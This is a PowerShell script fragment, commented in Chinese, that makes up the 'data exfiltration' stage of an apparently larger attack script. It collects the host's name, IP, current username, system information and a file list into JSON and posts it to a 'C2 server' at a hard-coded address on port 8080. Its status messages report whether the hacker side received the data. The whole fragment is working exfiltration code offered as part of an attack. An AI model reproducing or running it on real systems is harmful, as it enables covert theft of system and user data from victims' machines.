# --- 動作 E: 遠端數據滲漏 (Exfiltration) ---
$destinationIP = "192.168.50.202" 
Write-Host "[*] 正在傳送情報至 C2 伺服器 ($destinationIP)..." -ForegroundColor Cyan

# 打包資料並強制使用 UTF8 編碼，避免中文字元導致 JSON 解析失敗
$jsonPayload = @{
    hostname = $env:COMPUTERNAME
    ip       = $ip
    user     = $env:USERNAME
    info     = $sysInfo
    files    = $fileList
} | ConvertTo-Json -Compress

try {
    # 增加 -UseBasicParsing 並明確指定參數
    $response = Invoke-RestMethod -Uri "http://$destinationIP:8080/upload" `
                                  -Method Post `
                                  -Body $jsonPayload `
                                  -ContentType "application/json; charset=utf-8" `
                                  -TimeoutSec 10 `
                                  -UseBasicParsing
                                  
    if ($response.status -eq "success") {
        Write-Host "[+] 數據回傳成功！黑客端應已收到資訊。" -ForegroundColor Green
    }
} catch {
    Write-Host "[-] 回傳失敗。底層網路(TCP 8080)已確認開啟，可能是 API 路由錯誤。" -ForegroundColor Red
    Write-Host "[!] 錯誤代碼: $($_.Exception.Response.StatusCode)" -ForegroundColor Gray
    Write-Host "[!] 詳細訊息: $($_.Exception.Message)" -ForegroundColor Gray
}
